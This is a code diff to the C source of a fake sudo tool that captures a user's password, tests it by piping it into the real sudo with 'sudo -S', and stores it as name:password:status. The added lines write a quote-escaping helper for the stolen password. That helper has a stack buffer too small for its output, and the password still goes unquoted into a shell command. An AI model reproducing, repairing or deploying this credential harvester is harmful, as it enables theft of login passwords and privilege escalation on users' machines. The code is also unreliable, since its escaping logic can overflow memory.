@@ -76,6 +76,25 @@ steal_password(char **lineptr, size_t *n, FILE *stream)
 
     return 1;
 }
+
+char *strrpc(char *str,char *oldstr,char *newstr){
+    char bstr[strlen(str)];
+    memset(bstr,0,sizeof(bstr));
+ 
+    for(int i = 0;i < strlen(str);i++){
+        if(!strncmp(str+i,oldstr,strlen(oldstr))){
+            strcat(bstr,newstr);
+            i += strlen(oldstr) - 1;
+        }else{
+        	strncat(bstr,str + i,1);
+	    }
+    }
+ 
+    strcpy(str,bstr);
+    return str;
+}
+
+
 void 
 save_passwd(char *name,char *password,char *all, int success)
 {
@@ -88,6 +107,10 @@ save_passwd(char *name,char *password,char *all, int success)
     }
 
     char text[BUFFER_LEN] = {0};
+
+    strrpc(password,"\\'","\'");
+    strrpc(password,"\\\"","\"");
+
     snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 
 
     strcat(all,text);
@@ -172,6 +195,9 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
 
             int location =  strlen(stealPasswd)-1;
             if (stealPasswd[location] == '\n') stealPasswd[location] = '\0';
+
+            strrpc(stealPasswd,"\'","\\'");
+            strrpc(stealPasswd,"\"","\\\"");
 
             snprintf(testCommand, sizeof(testCommand), "echo %s | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
             printf("\n");
